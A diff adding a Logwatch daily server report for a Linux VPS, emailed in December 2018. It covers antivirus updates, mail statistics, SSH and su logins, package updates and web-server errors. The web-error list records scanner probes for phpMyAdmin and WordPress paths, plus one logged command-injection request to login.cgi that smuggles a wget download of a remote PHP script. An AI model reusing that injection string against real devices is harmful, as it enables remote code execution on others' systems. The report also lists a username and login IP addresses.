@@ -1,0 +1,221 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 707339F20C89; Wed, 12 Dec 2018 03:06:12 +0100 (CET)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20181212020612.707339F20C89@hrankiety.pl>
+Date: Wed, 12 Dec 2018 03:06:10 +0100 (CET)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Wed Dec 12 03:06:10 2018
+        Date Range Processed: yesterday
+                              ( 2018-Dec-11 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Tue Dec 11 04:25:07 2018
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.2 Recommended version: 0.101.0
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-25194.cdiff [100%]
+    Downloading daily-25195.cdiff [100%]
+    Downloading daily-25196.cdiff [100%]
+    daily.cld updated (version: 25196, sigs: 2178889, f-level: 63, builder: neo)
+    bytecode.cvd is up to date (version: 327, sigs: 91, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/bytecode.cvd and /var/lib/clamav/bytecode.cld, please manually remove one of them
+    Database updated (6745229 signatures) from db.local.clamav.net (IP: 104.16.185.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 1 Time(s)
+       \\phpmyadmin\\scripts\\setup.php: 1 Time(s)
+    404 Not Found
+       //wp-login.php: 1 Time(s)
+       /2phpmyadmin/scripts/setup.php: 1 Time(s)
+       /HNAP1: 1 Time(s)
+       /HNAP1/: 2 Time(s)
+       /MyAdmin/scripts/setup.php: 1 Time(s)
+       /PHPMYADMIN/scripts/setup.php: 1 Time(s)
+       /admin/PMA/index.php: 1 Time(s)
+       /admin/phpmyadmin/index.php: 1 Time(s)
+       /blog//wp-login.php: 1 Time(s)
+       /ccvv: 1 Time(s)
+       /cmd.php: 1 Time(s)
+       /config.inc.php: 1 Time(s)
+       /config/config.inc.php: 1 Time(s)
+       /db/scripts/setup.php: 1 Time(s)
+       /db_session.init.php: 1 Time(s)
+       /dbadmin/scripts/setup.php: 1 Time(s)
+       /evox/about: 1 Time(s)
+       /help.php: 1 Time(s)
+       /jexinv4/jexinv4.jsp: 1 Time(s)
+       /jexws4/jexws4.jsp: 1 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://12 ... 1.119/t.php%27$: 1 Time(s)
+       /my/scripts/setup.php: 1 Time(s)
+       /myadmin/scripts/setup.php: 1 Time(s)
+       /mysql/scripts/setup.php: 1 Time(s)
+       /mysqladmin/scripts/setup.php: 1 Time(s)
+       /nmaplowercheck1544563372: 1 Time(s)
+       /p/m/a/scripts/setup.php: 1 Time(s)
+       /pHpMyAdMiN/scripts/setup.php: 2 Time(s)
+       /phpAdmin/index.php: 1 Time(s)
+       /phpLDAPadmin/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin.old/index.php: 1 Time(s)
+       /phpMyAdmin/config/config.inc.php: 1 Time(s)
+       /phpMyAdmin/css/phpmyadmin.css.php: 1 Time(s)
+       /phpMyAdmin/libraries/database_interface.lib.php: 1 Time(s)
+       /phpMyAdmin/scripts/config.inc.php: 1 Time(s)
+       /phpMyAdmin/scripts/db___.init.php: 1 Time(s)
+       /phpMyAdmin/scripts/setup.php: 1 Time(s)
+       /phpMyadmi/index.php: 1 Time(s)
+       /phpadmin/index.php: 1 Time(s)
+       /phpmy-admin/scripts/setup.php: 1 Time(s)
+       /phpmyadmin/4.2/installing/: 1 Time(s)
+       /phpmyadmin/config.inc.php: 1 Time(s)
+       /phpmyadmin/config.user.inc.php: 1 Time(s)
+       /phpmyadmin/config/config.inc.php: 1 Time(s)
+       /phpmyadmin/config_inf.php: 1 Time(s)
+       /phpmyadmin/scripts/config.inc.php: 1 Time(s)
+       /phpmyadmin/scripts/db___.init.php: 1 Time(s)
+       /phpmyadmin/scripts/setup.php: 2 Time(s)
+       /phpmyadmin1/index.php: 1 Time(s)
+       /pma-old/index.php: 1 Time(s)
+       /pma/scripts/setup.php: 1 Time(s)
+       /qaq.php: 1 Time(s)
+       /scripts/setup.php: 1 Time(s)
+       /sdk: 1 Time(s)
+       /setup.php: 1 Time(s)
+       /sqladm/scripts/setup.php: 1 Time(s)
+       /sqladmin/scripts/setup.php: 1 Time(s)
+       /sqlweb/scripts/setup.php: 1 Time(s)
+       /tools/phpMyAdmin/index.php: 1 Time(s)
+       /w00tw00t.at.blackhats.romanian.anti-sec:): 1 Time(s)
+       /wordpress//wp-login.php: 1 Time(s)
+       /wp-login.php: 2 Time(s)
+       /wp//wp-login.php: 1 Time(s)
+       /wpo.php: 1 Time(s)
+       /xw.php: 1 Time(s)
+       /z.php: 1 Time(s)
+    405 Method Not Allowed
+       /: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- pam_unix Begin ------------------------ 
+
+ su:
+    Sessions Opened:
+       btertil -> root: 1 Time(s)
+ 
+ 
+ ---------------------- pam_unix End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+      147   *Warning: Pre-queue content-filter connection overload 
+     1204   SASL authentication failed 
+       81   Miscellaneous warnings 
+ 
+    2.073M  Bytes accepted                         2,173,445
+    2.067M  Bytes delivered                        2,167,248
+ ========   ================================================
+ 
+       34   Accepted                                  97.14%
+        1   Rejected                                   2.86%
+ --------   ------------------------------------------------
+       35   Total                                    100.00%
+ ========   ================================================
+ 
+        1   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        1   Total Rejects                            100.00%
+ ========   ================================================
+ 
+       28   4xx Reject sender address                100.00%
+ --------   ------------------------------------------------
+       28   Total 4xx Rejects                        100.00%
+ ========   ================================================
+ 
+     1318   Connections made      
+        1   Connections lost      
+     1318   Disconnections        
+       34   Removed from queue    
+       32   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+        1   SMTP commands dialog error 
+        1   SMTP protocol violations 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+       94.79.128.106 (b2b-94-79-128-106.unitymedia.biz): 1 time
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 3 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- yum Begin ------------------------ 
+
+ 
+ Packages Installed:
+    kernel-2.6.32-754.9.1.el6.i686
+    fail2ban-0.8.8-2.el6.noarch
+ 
+ Packages Updated:
+    kernel-headers-2.6.32-754.9.1.el6.i686
+    fail2ban-0.9.6-1.el6.1.noarch
+    kernel-firmware-2.6.32-754.9.1.el6.noarch
+ 
+ ---------------------- yum End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   27G   24G  53% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
